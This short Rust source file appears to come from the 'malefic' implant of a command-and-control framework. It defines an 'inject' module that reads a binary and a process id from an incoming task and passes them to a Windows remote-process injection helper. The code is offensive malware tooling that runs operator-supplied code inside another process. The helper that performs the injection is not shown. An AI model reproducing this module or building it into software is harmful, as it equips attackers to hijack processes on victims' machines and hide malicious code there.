use crate::{prelude::*, ModuleImpl, Result};
use async_trait::async_trait;
use malefic_helper::to_error;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_trait::module_impl;

pub struct Inject {}

#[async_trait]
#[module_impl("inject")]
impl Module for Inject {}

#[async_trait]
impl ModuleImpl for Inject {
    async fn run(&mut self, id: u32, receiver: &mut Input, _: &mut Output) -> Result {
        let req = check_request!(receiver, Body::Inject)?;

        let bin = check_field!(req.bin)?;
        to_error!(malefic_helper::win::inject::remote_inject(&*bin, req.pid))?;

        Ok(TaskResult::new(id))
    }
}